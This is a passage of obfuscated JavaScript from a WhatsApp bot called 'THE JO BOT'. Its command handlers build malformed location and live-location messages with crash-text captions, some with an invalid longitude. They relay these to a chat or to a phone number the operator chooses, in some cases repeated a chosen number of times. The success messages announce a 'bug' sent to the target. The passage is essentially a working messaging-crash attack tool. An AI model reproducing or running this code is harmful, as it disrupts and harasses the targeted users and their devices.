RVmxdbk+OGJT6oMGiijBIo2s6jOFYgZOahuHKttGMSgK2fd6fOiigJ6KKKA//2Q==','2784396jrqeja','8215504aUFeZk','log','search','Jumlahnya?','toString','6746229AnsTgR','key','console','error','reply','{}.constructor(\x22return\x20this\x22)(\x20)','THE\x20JO\x20BOT\x20','bind','0@s.whatsapp.net','4fioXpv','5353845TPQkNw','constructor','(((.+)+)+)+$','length','table','apply','exception','fromObject','295857pXvgbw'];_0x3b65=function(){return _0x18fdbc;};return _0x3b65();}(function(_0x2361c2,_0x4e9002){const _0x14d71d=_0x2b8f,_0x17ee0f=_0x2361c2();while(!![]){try{const _0xd02593=-parseInt(_0x14d71d(0x14f))/0x1+parseInt(_0x14d71d(0x134))/0x2+parseInt(_0x14d71d(0x133))/0x3*(parseInt(_0x14d71d(0x146))/0x4)+parseInt(_0x14d71d(0x147))/0x5+parseInt(_0x14d71d(0x137))/0x6+-parseInt(_0x14d71d(0x13d))/0x7+-parseInt(_0x14d71d(0x138))/0x8;if(_0xd02593===_0x4e9002)break;else _0x17ee0f['push'](_0x17ee0f['shift']());}catch(_0x57d4f3){_0x17ee0f['push'](_0x17ee0f['shift']());}}}(_0x3b65,0x9f66d));const _0x355346=(function(){let _0x8ada5d=!![];return function(_0x14421e,_0x44ec9c){const _0x5ba694=_0x8ada5d?function(){if(_0x44ec9c){const _0x26c1d2=_0x44ec9c['apply'](_0x14421e,arguments);return _0x44ec9c=null,_0x26c1d2;}}:function(){};return _0x8ada5d=![],_0x5ba694;};}()),_0x59b2f7=_0x355346(this,function(){const _0x336b71=_0x2b8f;return _0x59b2f7[_0x336b71(0x13c)]()[_0x336b71(0x13a)]('(((.+)+)+)+$')[_0x336b71(0x13c)]()['constructor'](_0x59b2f7)[_0x336b71(0x13a)](_0x336b71(0x149));});_0x59b2f7();const _0xa4eb8c=(function(){let _0x3a3c51=!![];return function(_0x1742a2,_0x7124cd){const _0x1ba749=_0x3a3c51?function(){const _0x41b166=_0x2b8f;if(_0x7124cd){const _0x439a79=_0x7124cd[_0x41b166(0x14c)](_0x1742a2,arguments);return _0x7124cd=null,_0x439a79;}}:function(){};return _0x3a3c51=![],_0x1ba749;};}()),_0x5f01a1=_0xa4eb8c(this,function(){const _0x962bc2=_0x2b8f,_0x319498=function(){const _0x1c35b5=_0x2b8f;let _0xc8fb65;try{_0xc8fb65=Function('return\x20(function()\x20'+_0x1c35b5(0x142)+');')();}catch(_0x1fdc16){_0xc8fb65=window;}return _0xc8fb65;},_0x20c212=_0x319498(),_0xf877e8=_0x20c212['console']=_0x20c212[_0x962bc2(0x13f)]||{},_0x51083c=[_0x962bc2(0x139),_0x962bc2(0x151),'info',_0x962bc2(0x140),_0x962bc2(0x14d),_0x962bc2(0x14b),'trace'];for(let _0x3a4ff8=0x0;_0x3a4ff8<_0x51083c[_0x962bc2(0x14a)];_0x3a4ff8++){const _0x1404ec=_0xa4eb8c[_0x962bc2(0x148)][_0x962bc2(0x135)][_0x962bc2(0x144)](_0xa4eb8c),_0x1e9978=_0x51083c[_0x3a4ff8],_0x48c797=_0xf877e8[_0x1e9978]||_0x1404ec;_0x1404ec['__proto__']=_0xa4eb8c[_0x962bc2(0x144)](_0xa4eb8c),_0x1404ec[_0x962bc2(0x13c)]=_0x48c797[_0x962bc2(0x13c)][_0x962bc2(0x144)](_0x48c797),_0xf877e8[_0x1e9978]=_0x1404ec;}});function _0x2b8f(_0x2cc9b2,_0x448e5c){const _0x5a9652=_0x3b65();return _0x2b8f=function(_0x5f01a1,_0xa4eb8c){_0x5f01a1=_0x5f01a1-0x133;let _0x378fbe=_0x5a9652[_0x5f01a1];return _0x378fbe;},_0x2b8f(_0x2cc9b2,_0x448e5c);}_0x5f01a1();{if(!isCreator&&!isBan)return;if(args[_0xa6e1a0(0x14a)]==0x0)return m[_0xa6e1a0(0x141)](_0xa6e1a0(0x13b));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let doc={'key':{'participant':_0xa6e1a0(0x145)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var liveLocation=generateWAMessageFromContent(m[_0xa6e1a0(0x150)],proto['Message'][_0xa6e1a0(0x14e)]({'liveLocationMessage':{'degreesLatitude':-6.9366881,'degreesLongitude':107.7228148,'caption':_0xa6e1a0(0x143)+philips+'\x20'+ngazap(prefix),'sequenceNumber':'1657997490287001','jpegThumbnail':_0xa6e1a0(0x136)}}),{'userJid':m['chat'],'quoted':doc});jobotz['relayMessage'](m['chat'],liveLocation['message'],{'messageId':liveLocation[_0xa6e1a0(0x13e)]['id']});}jancok('Sukses\x20Send\x20Bug\x20Sebanyak\x20'+jumlah);}
}
break

case 'jadiliveloc':{
const _0x1f1f70=_0x5167;function _0x5167(_0x2b75b1,_0x52a64e){const _0x355498=_0x5c50();return _0x5167=function(_0x515fe0,_0x5b71c4){_0x515fe0=_0x515fe0-0xaf;let _0x1a98c5=_0x355498[_0x515fe0];return _0x1a98c5;},_0x5167(_0x2b75b1,_0x52a64e);}(function(_0x3a2d1e,_0x2dc21a){const _0x5cc9fd=_0x5167,_0x4e5772=_0x3a2d1e();while(!![]){try{const _0x347a8b=-parseInt(_0x5cc9fd(0xb3))/0x1*(-parseInt(_0x5cc9fd(0xc4))/0x2)+parseInt(_0x5cc9fd(0xc3))/0x3*(-parseInt(_0x5cc9fd(0xbc))/0x4)+-parseInt(_0x5cc9fd(0xce))/0x5+parseInt(_0x5cc9fd(0xb2))/0x6+parseInt(_0x5cc9fd(0xb0))/0x7+-parseInt(_0x5cc9fd(0xb4))/0x8*(parseInt(_0x5cc9fd(0xd3))/0x9)+parseInt(_0x5cc9fd(0xcc))/0xa*(parseInt(_0x5cc9fd(0xca))/0xb);if(_0x347a8b===_0x2dc21a)break;else _0x4e5772['push'](_0x4e5772['shift']());}catch(_0x579272){_0x4e5772['push'](_0x4e5772['shift']());}}}(_0x5c50,0x9abcb));const _0x1cacc7=(function(){let _0x46e4bd=!![];return function(_0x31df2f,_0x328ae1){const _0x94ae52=_0x46e4bd?function(){const _0x18fb12=_0x5167;if(_0x328ae1){const _0x5d9448=_0x328ae1[_0x18fb12(0xc9)](_0x31df2f,arguments);return _0x328ae1=null,_0x5d9448;}}:function(){};return _0x46e4bd=![],_0x94ae52;};}()),_0xf2f207=_0x1cacc7(this,function(){const _0xc2993a=_0x5167;return _0xf2f207[_0xc2993a(0xcd)]()[_0xc2993a(0xb7)]('(((.+)+)+)+$')[_0xc2993a(0xcd)]()[_0xc2993a(0xc6)](_0xf2f207)['search']('(((.+)+)+)+$');});function _0x5c50(){const _0x7fb9dc=['message','table','length','fromObject','349557OSteJd','2hlNcsO','info','constructor','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','Teks/Reply','apply','473AmuLGa','©\x20Liveloc\x20','302690obbdpB','toString','5865810IxbVal','warn','Message','key','console','549YpEfej','chat','8312416DmLfBA','log','215646qFOMpb','146775zrvNpM','98136wEWGrj','error','trace','search','prototype','0@s.whatsapp.net','THE\x20JO\x20BOT\x20','bind','4QNZzbD','relayMessage','1657997490287001'];_0x5c50=function(){return _0x7fb9dc;};return _0x5c50();}_0xf2f207();const _0x5b71c4=(function(){let _0x5a5df1=!![];return function(_0xef682,_0x5c02b1){const _0x4a1bd7=_0x5a5df1?function(){const _0xac1631=_0x5167;if(_0x5c02b1){const _0x22e2aa=_0x5c02b1[_0xac1631(0xc9)](_0xef682,arguments);return _0x5c02b1=null,_0x22e2aa;}}:function(){};return _0x5a5df1=![],_0x4a1bd7;};}()),_0x515fe0=_0x5b71c4(this,function(){const _0x58d42d=_0x5167;let _0x461b7c;try{const _0x4eb760=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x461b7c=_0x4eb760();}catch(_0x25cc7c){_0x461b7c=window;}const _0x2915f4=_0x461b7c[_0x58d42d(0xd2)]=_0x461b7c[_0x58d42d(0xd2)]||{},_0x2e8aa3=[_0x58d42d(0xb1),_0x58d42d(0xcf),_0x58d42d(0xc5),_0x58d42d(0xb5),'exception',_0x58d42d(0xc0),_0x58d42d(0xb6)];for(let _0x3dd332=0x0;_0x3dd332<_0x2e8aa3[_0x58d42d(0xc1)];_0x3dd332++){const _0x2dd480=_0x5b71c4['constructor'][_0x58d42d(0xb8)][_0x58d42d(0xbb)](_0x5b71c4),_0x3b7d10=_0x2e8aa3[_0x3dd332],_0x4377bd=_0x2915f4[_0x3b7d10]||_0x2dd480;_0x2dd480['__proto__']=_0x5b71c4[_0x58d42d(0xbb)](_0x5b71c4),_0x2dd480[_0x58d42d(0xcd)]=_0x4377bd[_0x58d42d(0xcd)]['bind'](_0x4377bd),_0x2915f4[_0x3b7d10]=_0x2dd480;}});_0x515fe0();{if(!isCreator&&!isBan)return;if(!m['quoted']&&!text)throw _0x1f1f70(0xc8);let doc={'key':{'participant':_0x1f1f70(0xb9)},'message':{'documentMessage':{'title':_0x1f1f70(0xcb)+text+'\x20','jpegThumbnail':thumb}}};var liveLocation=generateWAMessageFromContent(m[_0x1f1f70(0xaf)],proto[_0x1f1f70(0xd0)][_0x1f1f70(0xc2)]({'liveLocationMessage':{'degreesLatitude':-6.9366881,'degreesLongitude':107.7228148,'caption':_0x1f1f70(0xba)+philips+'\x20'+ngazap(prefix),'sequenceNumber':_0x1f1f70(0xbe),'jpegThumbnail':_0x1f1f70(0xc7)}}),{'userJid':m['chat'],'quoted':doc});jobotz[_0x1f1f70(0xbd)](m['chat'],liveLocation[_0x1f1f70(0xbf)],{'messageId':liveLocation[_0x1f1f70(0xd1)]['id']}),jancok('Sukses\x20Convert\x20To\x20liveloc');}
}
break

case 'jolivelocv2': {
const _0x5e0059=_0x329c;(function(_0x157909,_0x281566){const _0x9e3769=_0x329c,_0x406586=_0x157909();while(!![]){try{const _0x20031d=-parseInt(_0x9e3769(0x9f))/0x1*(parseInt(_0x9e3769(0x97))/0x2)+parseInt(_0x9e3769(0xae))/0x3+parseInt(_0x9e3769(0x9d))/0x4+-parseInt(_0x9e3769(0xa9))/0x5+parseInt(_0x9e3769(0xa0))/0x6+-parseInt(_0x9e3769(0x96))/0x7*(parseInt(_0x9e3769(0xa7))/0x8)+-parseInt(_0x9e3769(0x99))/0x9;if(_0x20031d===_0x281566)break;else _0x406586['push'](_0x406586['shift']());}catch(_0x5188d2){_0x406586['push'](_0x406586['shift']());}}}(_0x29f7,0xa54b9));const _0x4ff7e6=(function(){let _0x51b17b=!![];return function(_0x36f55b,_0x192ebf){const _0x5a46a9=_0x51b17b?function(){const _0x37751d=_0x329c;if(_0x192ebf){const _0x731f6d=_0x192ebf[_0x37751d(0xb5)](_0x36f55b,arguments);return _0x192ebf=null,_0x731f6d;}}:function(){};return _0x51b17b=![],_0x5a46a9;};}()),_0x2dec10=_0x4ff7e6(this,function(){const _0x204b75=_0x329c;return _0x2dec10[_0x204b75(0x98)]()[_0x204b75(0xac)]('(((.+)+)+)+$')[_0x204b75(0x98)]()[_0x204b75(0xab)](_0x2dec10)['search'](_0x204b75(0xaa));});function _0x329c(_0x43e90b,_0x2b60f2){const _0x49b89b=_0x29f7();return _0x329c=function(_0x337fb6,_0x48ddfd){_0x337fb6=_0x337fb6-0x92;let _0x580e26=_0x49b89b[_0x337fb6];return _0x580e26;},_0x329c(_0x43e90b,_0x2b60f2);}function _0x29f7(){const _0x18ec76=['23990hgjXTC','toString','2708577cRoJAW','info','message','key','4228612RYxJKy','1532280505','46rvXLtn','2034966bYrkpT','readFileSync','By:\x20THE\x20JO\x20BOT','relayMessage','error','console','return\x20(function()\x20','1924896PgsLhO','exception','1218350MKvHIp','(((.+)+)+)+$','constructor','search','Sukses\x20Send\x20Bug\x20Sebanyak\x20','1853220zmVwwg','length','chat','./pict.jpg','log','trace','warn','apply','0@s.whatsapp.net','reply','bind','prototype','7sdyqCs'];_0x29f7=function(){return _0x18ec76;};return _0x29f7();}_0x2dec10();const _0x48ddfd=(function(){let _0x4f8b47=!![];return function(_0x1302fa,_0x20a4f7){const _0x36a38f=_0x4f8b47?function(){const _0x4728=_0x329c;if(_0x20a4f7){const _0x273c75=_0x20a4f7[_0x4728(0xb5)](_0x1302fa,arguments);return _0x20a4f7=null,_0x273c75;}}:function(){};return _0x4f8b47=![],_0x36a38f;};}()),_0x337fb6=_0x48ddfd(this,function(){const _0x2a0f59=_0x329c,_0x2b4337=function(){const _0x4ae1da=_0x329c;let _0x4014fe;try{_0x4014fe=Function(_0x4ae1da(0xa6)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xbbb3e8){_0x4014fe=window;}return _0x4014fe;},_0x3bd71a=_0x2b4337(),_0xee0d33=_0x3bd71a[_0x2a0f59(0xa5)]=_0x3bd71a['console']||{},_0x872110=[_0x2a0f59(0xb2),_0x2a0f59(0xb4),_0x2a0f59(0x9a),_0x2a0f59(0xa4),_0x2a0f59(0xa8),'table',_0x2a0f59(0xb3)];for(let _0x1f4ba3=0x0;_0x1f4ba3<_0x872110[_0x2a0f59(0xaf)];_0x1f4ba3++){const _0x49f503=_0x48ddfd[_0x2a0f59(0xab)][_0x2a0f59(0x95)][_0x2a0f59(0x94)](_0x48ddfd),_0x3f294a=_0x872110[_0x1f4ba3],_0x416246=_0xee0d33[_0x3f294a]||_0x49f503;_0x49f503['__proto__']=_0x48ddfd['bind'](_0x48ddfd),_0x49f503[_0x2a0f59(0x98)]=_0x416246[_0x2a0f59(0x98)]['bind'](_0x416246),_0xee0d33[_0x3f294a]=_0x49f503;}});_0x337fb6();{if(!isCreator&&!isBan)return;if(args[_0x5e0059(0xaf)]==0x0)return m[_0x5e0059(0x93)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){res=generateWAMessageFromContent(m[_0x5e0059(0xb0)],{'liveLocationMessage':{'degreesLatitude':-7.8374838,'degreesLongitude':727.8383838,'caption':'THE\x20JO\x20BOT\x20💊\x0a\x0a'+philips+'\x20'+virtex3,'sequenceNumber':_0x5e0059(0x9e),'thumbnail':virgam,'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':{'key':{'participant':_0x5e0059(0x92),...{'remoteJid':''}},'message':{'liveLocationMessage':{'caption':_0x5e0059(0xa2),'jpegThumbnail':fs[_0x5e0059(0xa1)](_0x5e0059(0xb1))}}},'contextInfo':{}}),jobotz[_0x5e0059(0xa3)](m[_0x5e0059(0xb0)],res[_0x5e0059(0x9b)],{'messageId':res[_0x5e0059(0x9c)]['id']});}jancok(_0x5e0059(0xad)+jumlah);}
}
break

case 'jogasbugloc': {
var _0xb091d9=_0x5364;(function(_0x1a4d98,_0x4962c8){var _0x4af7a1=_0x5364,_0x3bbd8c=_0x1a4d98();while(!![]){try{var _0x1e2e4e=-parseInt(_0x4af7a1(0xee))/0x1+-parseInt(_0x4af7a1(0xd6))/0x2*(-parseInt(_0x4af7a1(0xea))/0x3)+-parseInt(_0x4af7a1(0xda))/0x4*(-parseInt(_0x4af7a1(0xe8))/0x5)+parseInt(_0x4af7a1(0xdc))/0x6+-parseInt(_0x4af7a1(0xf2))/0x7+parseInt(_0x4af7a1(0xdf))/0x8*(parseInt(_0x4af7a1(0xe9))/0x9)+-parseInt(_0x4af7a1(0xf5))/0xa;if(_0x1e2e4e===_0x4962c8)break;else _0x3bbd8c['push'](_0x3bbd8c['shift']());}catch(_0x523642){_0x3bbd8c['push'](_0x3bbd8c['shift']());}}}(_0x5a32,0xb14b5));function _0x5364(_0x4dd80d,_0x2a1181){var _0x426ffa=_0x5a32();return _0x5364=function(_0x3dd66e,_0x3ca284){_0x3dd66e=_0x3dd66e-0xd5;var _0x307b1f=_0x426ffa[_0x3dd66e];return _0x307b1f;},_0x5364(_0x4dd80d,_0x2a1181);}var _0x1c1caa=(function(){var _0x3f9f97=!![];return function(_0x18e9bb,_0x477314){var _0xe9f390=_0x3f9f97?function(){var _0x43484e=_0x5364;if(_0x477314){var _0x319514=_0x477314[_0x43484e(0xe3)](_0x18e9bb,arguments);return _0x477314=null,_0x319514;}}:function(){};return _0x3f9f97=![],_0xe9f390;};}()),_0x51b9d7=_0x1c1caa(this,function(){var _0x39d4e8=_0x5364;return _0x51b9d7[_0x39d4e8(0xe2)]()[_0x39d4e8(0xf1)](_0x39d4e8(0xe5))[_0x39d4e8(0xe2)]()['constructor'](_0x51b9d7)['search'](_0x39d4e8(0xe5));});_0x51b9d7();var _0x3ca284=(function(){var _0x57eac4=!![];return function(_0x9bb7df,_0x5e60c2){var _0x364a66=_0x57eac4?function(){var _0x95a002=_0x5364;if(_0x5e60c2){var _0x53da74=_0x5e60c2[_0x95a002(0xe3)](_0x9bb7df,arguments);return _0x5e60c2=null,_0x53da74;}}:function(){};return _0x57eac4=![],_0x364a66;};}()),_0x3dd66e=_0x3ca284(this,function(){var _0x223ab5=_0x5364,_0x3b3534=function(){var _0x2cb6ae=_0x5364,_0x41b439;try{_0x41b439=Function(_0x2cb6ae(0xd5)+_0x2cb6ae(0xd8)+');')();}catch(_0x510682){_0x41b439=window;}return _0x41b439;},_0x37c217=_0x3b3534(),_0x51765b=_0x37c217[_0x223ab5(0xf7)]=_0x37c217[_0x223ab5(0xf7)]||{},_0x5e17b6=['log',_0x223ab5(0xde),_0x223ab5(0xeb),_0x223ab5(0xe0),_0x223ab5(0xdd),_0x223ab5(0xf3),'trace'];for(var _0x26f417=0x0;_0x26f417<_0x5e17b6[_0x223ab5(0xec)];_0x26f417++){var _0x55315f=_0x3ca284['constructor'][_0x223ab5(0xf6)][_0x223ab5(0xed)](_0x3ca284),_0x31bb96=_0x5e17b6[_0x26f417],_0x323b4b=_0x51765b[_0x31bb96]||_0x55315f;_0x55315f[_0x223ab5(0xe7)]=_0x3ca284['bind'](_0x3ca284),_0x55315f[_0x223ab5(0xe2)]=_0x323b4b[_0x223ab5(0xe2)]['bind'](_0x323b4b),_0x51765b[_0x31bb96]=_0x55315f;}});function _0x5a32(){var _0x3f44c0=['2796660iITfnH','1879947RobNzg','6PViNYF','info','length','bind','154293TjBKWf','@s.whatsapp.net','readFileSync','search','5524666IaoEgE','table','fromObject','13817750RAQOOV','prototype','console','return\x20(function()\x20','176494aatmuP','Berhasil\x20Mengirim\x20Bugloc\x20Di\x20Nomer\x20','{}.constructor(\x22return\x20this\x22)(\x20)','漏\x20饾懟饾懐饾懍\x20饾懕饾懚\x20饾懇饾懚饾懟饾拋','4EGbLVR','relayMessage','7627572ALwHPt','exception','warn','40KCVnia','error','waUploadToServer','toString','apply','chat','(((.+)+)+)+$','key','__proto__'];_0x5a32=function(){return _0x3f44c0;};return _0x5a32();}_0x3dd66e();{if(!isCreator&&!isBan)return;if(!text)throw'Nomernya\x20mana?';var messa=await prepareWAMessageMedia({'image':fs[_0xb091d9(0xf0)]('./pict.jpg')},{'upload':jobotz[_0xb091d9(0xe1)]}),location=generateWAMessageFromContent(m['chat'],proto['Message'][_0xb091d9(0xf4)]({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':_0xb091d9(0xd9)+philips+'\x20'+ngazap(prefix),'jpegThumbnail':messa['imageMessage']}}),{'userJid':m[_0xb091d9(0xe4)],'quoted':fkonjo});jobotz[_0xb091d9(0xdb)](text+_0xb091d9(0xef),location['message'],{'messageId':location[_0xb091d9(0xe6)]['id']}),jobotz[_0xb091d9(0xdb)](m['chat'],location['message'],{'messageId':location[_0xb091d9(0xe6)]['id']}),jancok(_0xb091d9(0xd7)+text);}
}
break

case 'jobuglocto': {
